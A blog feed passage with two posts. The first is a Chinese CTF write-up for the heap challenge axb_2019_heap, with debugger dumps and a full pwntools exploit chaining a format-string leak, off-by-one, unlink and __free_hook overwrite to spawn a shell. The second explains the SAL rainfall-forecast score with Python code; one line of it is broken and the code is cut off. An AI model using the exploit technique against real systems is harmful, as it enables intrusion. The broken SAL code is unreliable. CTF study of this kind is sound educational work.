<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55d2cb54e0a0</span><br><span class="line">Size: 0xa0			#修改标志位，表示上一个chunk被释放</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e140</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e1e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55d2cb54e000</span><br><span class="line">0x55d2cb54e000:	0x0000000000000000	0x00000000000000a1	#第一个chunk</span><br><span class="line">0x55d2cb54e010:	0x0000000000000000	0x0000000000000090	#fake chunk</span><br><span class="line">0x55d2cb54e020:	0x000055d2cb00d048	0x000055d2cb00d050	#fd、bk</span><br><span class="line">0x55d2cb54e030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e080:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e090:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e0a0:	0x0000000000000090	0x00000000000000a0	#pre_size &#x3D; 0x90,size &#x3D; 0xa0</span><br><span class="line">0x55d2cb54e0b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55d2cb54e0c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">note &#x3D; pro_base + 0x0202060</span><br><span class="line">payload &#x3D; p64(0) + p64(0x90)</span><br><span class="line">payload +&#x3D; p64(fd) + p64(bk)</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 0x70</span><br><span class="line">payload +&#x3D; p64(0x90) + p8(0xa0)</span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">edit(0,payload)</span><br><span class="line">print(hex(note))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>释放第二个chunk，造成unlink，target = target - 0x18</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#没变化</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55682bfdf000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55682bfdf0a0</span><br><span class="line">Size: 0xa0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55682bfdf140</span><br><span class="line">Size: 0xa0</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55682bfdf1e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55682bfdf000</span><br><span class="line">0x55682bfdf000:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55682bfdf010:	0x0000000000000000	0x0000000000000131	#合并了，大小为0x90 + 0xa0</span><br><span class="line">0x55682bfdf020:	0x00007fea30ac5b78	0x00007fea30ac5b78</span><br><span class="line">0x55682bfdf030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf080:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf090:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf0a0:	0x0000000000000090	0x00000000000000a0</span><br><span class="line">0x55682bfdf0b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55682bfdf0c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55682b44c060</span><br><span class="line">0x55682b44c060 &lt;note&gt;:	0x000055682b44c048	0x0000000000000098#target &#x3D; target - 0x18</span><br><span class="line">0x55682b44c070 &lt;note+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55682b44c080 &lt;note+32&gt;:	0x000055682bfdf150	0x0000000000000098</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dele(1)</span><br></pre></td></tr></table></figure>
<h4 id="3-修改-free-hook为system"><a href="#3-修改-free-hook为system" class="headerlink" title="3.修改__free_hook为system"></a>3.修改__free_hook为system</h4><blockquote>
<p>通过第一个chunk，覆盖第一个chunk的指针指向__free_hook的地址</p>
<p>设置第二个chunk为参数“/bin/sh\x00”，只要让chunk2指向后面的地址，在上面的地址布置上字符串即可。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55cbe5291060</span><br><span class="line">0x55cbe5291060 &lt;note&gt;:	0x00007f962216f7a8	0x0000000000000098		#__free_hook地址</span><br><span class="line">0x55cbe5291070 &lt;note+16&gt;:	0x000055cbe5291078	0x0068732f6e69622f	#binsh地址 binsh字符串</span><br><span class="line">0x55cbe5291080 &lt;note+32&gt;:	0x000055cbe5975100	0x0000000000000098</span><br><span class="line">0x55cbe5291090 &lt;note+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f962216f7a8</span><br><span class="line">0x7f962216f7a8 &lt;__free_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">payload &#x3D; p64(0) * 3</span><br><span class="line">payload +&#x3D; p64(free_hook) + p64(0x98)</span><br><span class="line">payload +&#x3D; p64(note + 24) +&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">edit(0,payload)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第一个chunk指向<code>__free_hook</code>，往chunk1填入数据就是往<code>__free_hook</code>填入数据，修改其为system地址。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5578fc638060</span><br><span class="line">0x5578fc638060 &lt;note&gt;:	0x00007f909293e7a8	0x0000000000000098</span><br><span class="line">0x5578fc638070 &lt;note+16&gt;:	0x00005578fc638078	0x0068732f6e69622f</span><br><span class="line">0x5578fc638080 &lt;note+32&gt;:	0x00005578fd63e100	0x0000000000000098</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f909293e7a8</span><br><span class="line">0x7f909293e7a8 &lt;__free_hook&gt;:	0x00007f90925bd3a0</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f90925bd3a0</span><br><span class="line">0x7f90925bd3a0 &lt;__libc_system&gt;:	0xfa86e90b74ff8548</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edit(0,p64(system))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>最后，释放第二个chunk即可执行free(2) =&gt; system(“/bin/sh\x00”)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dele(1)</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./axb_2019_heap"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",28733)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./axb_2019_heap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"to create (0-10):"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter a size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter an index:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter an index:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the content: "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter your name: "</span>)</span><br><span class="line">payload = <span class="string">"%15$p.%19$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">main_240 = int(p.recvuntil(<span class="string">"."</span>)[<span class="number">-13</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">push_rbp = int(p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-13</span>:],<span class="number">16</span>)</span><br><span class="line">print(hex(main_240))</span><br><span class="line">print(hex(push_rbp))</span><br><span class="line"></span><br><span class="line">libc_base = main_240 - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">240</span></span><br><span class="line">pro_base = push_rbp - <span class="number">0x116a</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(pro_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">note = pro_base + <span class="number">0x0202060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">'cccc'</span>)</span><br><span class="line">print(hex(note))</span><br><span class="line"></span><br><span class="line">fd = note - <span class="number">0x18</span></span><br><span class="line">bk = note - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p8(<span class="number">0xa0</span>)</span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">print(hex(note))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(free_hook) + p64(<span class="number">0x98</span>)</span><br><span class="line">payload += p64(note + <span class="number">24</span>) +<span class="string">"/bin/sh\x00"</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"></span><br><span class="line">print(hex(note))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>组合拳，题型：fmt + off by one + unlink</p>
</blockquote>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>SAL_StructureAmplitudeLocation</title>
    <url>/2022/03/02/14-50/</url>
    <content><![CDATA[<h3 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h3><p>SAL方法 通过三个分量，分别从 <strong>场结构、降水强度和场位置偏差</strong> 对预测结果进行评价</p>
<h4 id="threshold"><a href="#threshold" class="headerlink" title="threshold"></a>threshold</h4><p>确定方法是经验法</p>
<p>阈值的设定，效果是大于阈值的格点才会被定为<strong>降水主体成员</strong>（<strong>降水体</strong>：降水主体内（各不连续的小降水区域）每个连续的小区域），只有<strong>降水主体成员</strong>才参与上述S、L2的运算</p>
<h4 id="three-component"><a href="#three-component" class="headerlink" title="three component"></a>three component</h4><ol>
<li><p>计算<strong>总雨带</strong>特征：A、L1 （与阈值无关）</p>
</li>
<li><p>计算<strong>内部结构</strong>特征：S、L2</p>
</li>
</ol>
<h5 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h5><p>S表示Structure 结构，提供 预测场和观测场 有关其<strong>大小</strong>和<strong>形状</strong>的信息。</p>
<ol>
<li>正值 -&gt; 表示模拟的降水对象<strong>太大或太平</strong></li>
<li>负值 -&gt; 表示对象<strong>太尖锐或太小</strong></li>
</ol>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/S%E8%AF%84%E5%88%86%E7%AE%80%E4%BB%8B.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/S%E8%AF%84%E5%88%86%E7%AE%80%E4%BB%8B.png"></p>
<h5 id="Amplitude"><a href="#Amplitude" class="headerlink" title="Amplitude"></a>Amplitude</h5><p>A表示Amplitude （振幅）<strong>降水强度</strong></p>
<ol>
<li><p>正值 -&gt; 表示对总降水量的估计过高</p>
</li>
<li><p>负值 -&gt; 表示对总降水量的估计过低</p>
</li>
</ol>
<h5 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h5><p>L表示Location位置，提供预测场和观测场 <strong>位置偏差</strong>信息</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/L%E8%AF%84%E5%88%86%E7%AE%80%E4%BB%8B.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/L%E8%AF%84%E5%88%86%E7%AE%80%E4%BB%8B.png"></p>
<p>分为L1、L2两部分</p>
<ol>
<li><p>L1表示预报场与观测场质心之间的归一化距离。（两个场质心之间的距离）</p>
</li>
<li><p>L2是总降水场的质心与观测和预报的个别降水对象的归一化距离之差。（每个降水对象到质心的距离）</p>
<p>L2是为了预防下图情况，由于观测场分为两块，质心在中间，与预测场重合</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/L2%E8%AF%84%E5%88%86%E7%AE%80%E4%BB%8B.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/L2%E8%AF%84%E5%88%86%E7%AE%80%E4%BB%8B.png"> </p>
<h4 id="some-example"><a href="#some-example" class="headerlink" title="some example"></a>some example</h4></li>
</ol>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/SAL%E4%BE%8B%E5%AD%90.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/SAL%E4%BE%8B%E5%AD%90.png"></p>
<p> （ S = 0、A=0、L=0表示完美匹配）</p>
<h3 id="具体公式"><a href="#具体公式" class="headerlink" title="具体公式"></a>具体公式</h3><h4 id="S-结构"><a href="#S-结构" class="headerlink" title="S - 结构"></a>S - 结构</h4><p>公式：$S = \frac{V(R_{mod})-V(R_{obs})}{0.5[V(R_{mod})+V(R_{obs})]}$</p>
<ol>
<li><p>$V(R_{mod})$：预测场中所有降水体以体内<strong>总降水量为权重</strong>的$V_n$的加权平均</p>
<ol>
<li>公式：$V(R) = \frac{\sum^{m}_{n=1}R_nV_n}{\sum^m_{n=1}R_n}$<ol>
<li>$R_n$：降水体的总降水量</li>
</ol>
</li>
</ol>
</li>
<li><p>$V_n$：第n个降水体内的<strong>总降水量</strong>与<strong>最大降水量</strong>之<strong>比</strong></p>
<p>😃降水量就是某一个降水体每个降水值的总和</p>
<ol>
<li><p>公式：$V_n = {\displaystyle \sum_{(i,j)\in R_n} {R_{i,j}/R^{max}_n} = R_n/R^{max}_n}$</p>
<ol>
<li><p>$R_{i,j}$：格点（i，j）处的降水</p>
</li>
<li><p>$R^{max}_{n}$：降水体n内的最大降水值</p>
<p>😃降水体相当于是面积，最大值表示这块面积里面的某一个点的最大值</p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h4 id="A-强度"><a href="#A-强度" class="headerlink" title="A - 强度"></a>A - 强度</h4><p>公式：$A = \frac {D(R_{mod}) - D(R_{obs})} {0.5[D(R_{mod}) + D(R_{obs})]}$</p>
<ol>
<li>$D(R) = \frac{1}{N} \displaystyle \sum_{(i,j)\in D}{R_{i,j}}$   →   $D(R)$为所取区域内非缺省格点降水的<strong>平均值</strong></li>
</ol>
<h4 id="L-位置"><a href="#L-位置" class="headerlink" title="L - 位置"></a>L - 位置</h4><p>公式</p>
<ol>
<li><p>$L = L_1 + L_2$</p>
<ol>
<li><p>$L_1 = \frac{|x(R_{mod})-x(R_{obs})|}{d}$  →   L1为区域D实况与预报降水主体中心之间的距离</p>
<ol>
<li>$x(R)$：表示所取区域D内降水主体的<strong>重心位置</strong></li>
<li>$d$：区域D内最大距离</li>
</ol>
</li>
<li><p>$L_2 = 2\cdot{\frac{r(R_{mod})-r(R_{obs})}{d}}$  →   L2为降水主体重心与降水场每个降水体重心之间的平均距离</p>
<ol>
<li><p>$r =  \frac{\sum ^{m}_{n=1}{R_n \cdot{|x-x_n|}}}{\sum^{m}_{n=1}R_n}$   </p>
<ol>
<li>$m$ 表示降水体个数</li>
<li>$r(R)$   表示各降水体重心与降水主体中心之间距离<strong>加权平均</strong>（权重是雨量）的权重</li>
<li>降水体雨量越大 → 离降水主体重心越远 → r值越大 → 最大值为(1/2)d</li>
</ol>
</li>
<li><p>$R_n = \displaystyle \sum_{(i,j)\in R_n}{R_{i,j}}$  →   区域内第n个降水体的降水量</p>
<p>😃降水体是一个小连续区域，就是它的总降水量</p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> ndimage</span><br><span class="line"><span class="comment">#numpy.linalg模块包含线性代数的函数。使用这个模块，可以计算逆矩阵、求特征值、解线性方程组以及求解行列式等。</span></span><br><span class="line"><span class="comment">#norm则表示范数</span></span><br><span class="line"><span class="keyword">from</span> numpy.linalg <span class="keyword">import</span> norm</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">np.set_printoptions(threshold=np.inf)</span><br><span class="line"></span><br><span class="line"><span class="comment">#obs：观测场；fc：预测场</span></span><br><span class="line"><span class="comment">#返回值前三个是S、A、L，还有其他信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute_SAL</span><span class="params">(field_obs, field_fc, user_threshold=None)</span>:</span></span><br><span class="line">    <span class="string">"""SAL-score (Structure, Amplitude, Location)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters</span></span><br><span class="line"><span class="string">    ----------</span></span><br><span class="line"><span class="string">    field_obs : numpy.ndarray</span></span><br><span class="line"><span class="string">        2D observation (or reference) field</span></span><br><span class="line"><span class="string">    field_fc : numpy.ndarray</span></span><br><span class="line"><span class="string">        2D forecast field (same shape as `field_obs`)</span></span><br><span class="line"><span class="string">    user_threshold : float, optional</span></span><br><span class="line"><span class="string">        If set, use this threshold for object separation. 如果已设置，请使用此阈值进行对象分离。</span></span><br><span class="line"><span class="string">        If not set, use the default method of Wernli is used: ``threshold = field_obs.max() * 1/15``</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns</span></span><br><span class="line"><span class="string">    -------</span></span><br><span class="line"><span class="string">    S : float</span></span><br><span class="line"><span class="string">        Structure score</span></span><br><span class="line"><span class="string">    A : float</span></span><br><span class="line"><span class="string">        Amplitude score</span></span><br><span class="line"><span class="string">    L : float</span></span><br><span class="line"><span class="string">        Location score</span></span><br><span class="line"><span class="string">    L1, L2 : float</span></span><br><span class="line"><span class="string">        Location score components `L1` and `L2`</span></span><br><span class="line"><span class="string">    NObjects_obs : float</span></span><br><span class="line"><span class="string">        Number of thresholded objects in observation 观察中的阈值对象数</span></span><br><span class="line"><span class="string">    NObjects_mod : float</span></span><br><span class="line"><span class="string">        Number of objects in model (forecast `fc`) 模型中的对象数（预测“fc”）</span></span><br><span class="line"><span class="string">    R_max : float</span></span><br><span class="line"><span class="string">        Maximum Rain-value of observations `field_obs` 观测值的最大降雨值`</span></span><br><span class="line"><span class="string">    user_treshold : float</span></span><br><span class="line"><span class="string">        Threshold that was actually used 实际使用的阈值</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> (field_obs.shape != field_fc.shape):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"field_obs and field_fc need to have the same shape"</span> +\</span><br><span class="line">        <span class="string">" (this function also assumes that they cover the same domain!)"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user_threshold <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>) <span class="keyword">and</span> (type(user_threshold) != float):<span class="comment">#user_threshold是给定的阈值</span></span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"user_threshold must be a float"</span>)</span><br><span class="line"></span><br><span class="line">    R_mod = field_fc  <span class="comment"># "mod" is for "model"          预测场的数据</span></span><br><span class="line">    R_obs = field_obs <span class="comment"># "obs" is for "observation"    观测场的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#不能出现有数据小于0的，出现即报错</span></span><br><span class="line">    <span class="keyword">if</span> np.any(R_mod &lt; <span class="number">0.</span>):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"negative values in forecast."</span> +\</span><br><span class="line">        <span class="string">"use different field or apply SAL.threshold_to_zero(field)"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> np.any(R_obs &lt; <span class="number">0.</span>):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"negative values in forecast."</span> +\</span><br><span class="line">        <span class="string">"use different field or apply SAL.threshold_to_zero(field)"</span>)</span><br><span class="line"></span><br><span class="line">    f_threshold = <span class="number">1</span>/<span class="number">15.</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#nanpercentile：不算nan值找到第95个百分数</span></span><br><span class="line">    <span class="comment">#https://www.cjavapy.com/article/1088/</span></span><br><span class="line">    R_max_obs = np.nanpercentile(np.where(R_obs&gt;<span class="number">0.1</span>, R_obs, np.nan), <span class="number">95</span>)<span class="comment">#最大*0.95</span></span><br><span class="line">    threshold_obs = R_max_obs * f_threshold<span class="comment">#1/15</span></span><br><span class="line">    </span><br><span class="line">    R_max_mod = np.nanpercentile(np.where(R_mod&gt;<span class="number">0.1</span>, R_mod,np.nan), <span class="number">95</span>)</span><br><span class="line">    threshold_mod = R_max_mod * f_threshold</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user_threshold <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">        threshold_obs = user_threshold</span><br><span class="line">        threshold_mod = user_threshold</span><br><span class="line"></span><br><span class="line">    R_mod_thr = np.where(R_mod &gt; threshold_mod, R_mod, <span class="number">0.</span>) <span class="comment"># 所有的降水体</span></span><br><span class="line">    R_obs_thr = np.where(R_obs &gt; threshold_obs, R_obs, <span class="number">0.</span>) <span class="comment"># maskiert</span></span><br><span class="line"></span><br><span class="line">    D_R_mod = np.mean(R_mod)<span class="comment">#平均值</span></span><br><span class="line">    D_R_obs = np.mean(R_obs)</span><br><span class="line"></span><br><span class="line">    A = (D_R_mod - D_R_obs) / (<span class="number">0.5</span> * (D_R_mod + D_R_obs))<span class="comment">#与阈值无关</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x_R_mod: center of mass of mod</span></span><br><span class="line">    x_R_mod = np.array(ndimage.measurements.center_of_mass(R_mod))<span class="comment">#nb，直接调用函数找出质点</span></span><br><span class="line">    <span class="comment"># x_R_obs: center of mass of obs</span></span><br><span class="line">    x_R_obs = np.array(ndimage.measurements.center_of_mass(R_obs))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#norm默认是2范式，每个元素先平方，再根号，也就是对角线距离</span></span><br><span class="line">    d_diagonal = norm(<span class="comment">#field_obs.shape)</span></span><br><span class="line">   </span><br><span class="line">    L1 = norm(x_R_mod - x_R_obs) / d_diagonal<span class="comment">#与阈值无关</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">##label标记连接成分</span></span><br><span class="line">    <span class="comment">#https://blog.csdn.net/Monkey_dada/article/details/119353323?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link</span></span><br><span class="line">    labels_mod, NObjects_mod = ndimage.measurements.label(R_mod_thr)<span class="comment">#label标记连接成分,在找降水体</span></span><br><span class="line">    labels_obs, NObjects_obs = ndimage.measurements.label(R_obs_thr)</span><br><span class="line"></span><br><span class="line">    labels_list = [labels_mod, labels_obs]</span><br><span class="line">    NObjects_list = [NObjects_mod, NObjects_obs]</span><br><span class="line"></span><br><span class="line">    R_list = [R_mod, R_obs]</span><br><span class="line">    x_R_list = [x_R_mod, x_R_obs]</span><br><span class="line"></span><br><span class="line">    r_list = [<span class="number">0</span>,<span class="number">0</span>] <span class="comment"># fuer L2</span></span><br><span class="line">    V_list = [<span class="number">0</span>,<span class="number">0</span>] <span class="comment"># fuer S</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> iList, NObjects <span class="keyword">in</span> enumerate(NObjects_list):</span><br><span class="line">        R_n_list = np.zeros(NObjects)</span><br><span class="line">        V_n_list = np.zeros(NObjects)</span><br><span class="line">        distance_n_list = np.zeros(NObjects)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(NObjects):</span><br><span class="line"></span><br><span class="line">            label = n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            object_n = np.where(labels_list[iList] == label, R_list[iList], <span class="number">0</span>)</span><br><span class="line">            R_n_list[n] = object_n.sum()</span><br><span class="line">            V_n_list[n] = R_n_list[n] / object_n.max()</span><br><span class="line">            x_n = np.array(ndimage.measurements.center_of_mass(object_n))</span><br><span class="line">            distance_n_list[n] = norm(x_R_list[iList] - x_n)</span><br><span class="line"></span><br><span class="line">        R_n_list = np.array(R_n_list)</span><br><span class="line">        distance_n_list = np.array(distance_n_list)</span><br><span class="line">        r_list[iList] = (R_n_list*distance_n_list).sum() / R_n_list.sum()</span><br><span class="line">        V_list[iList] = (R_n_list*V_n_list).sum() / R_n_list.sum()</span><br><span class="line"></span><br><span class="line">    L2 = <span class="number">2.</span>*norm(r_list[<span class="number">0</span>] - r_list[<span class="number">1</span>]) / d_diagonal</span><br><span class="line">    L = L1 + L2</span><br><span class="line">    S = (V_list[<span class="number">0</span>] - V_list[<span class="number">1</span>]) / (<span class="number">0.5</span> * (V_list[<span class="number">0</span>] + V_list[<span class="number">1</span>])) <span class="comment"># 0: mod, 1:obs</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> S, A, L, L1, L2, NObjects_obs, NObjects_mod, R_max_obs, R_max_mod, threshold_obs, threshold_mod</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印结果	</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PrintResultSAL</span><span class="params">(field_obs, field_fc, user_threshold=None)</span>:</span></span><br><span class="line">    S, A, L, L1, L2, NObjects_obs, NObjects_mod, R_max_obs, R_max_mod, threshold_obs, threshold_mod = compute_SAL(field_obs,field_fc)</span><br><span 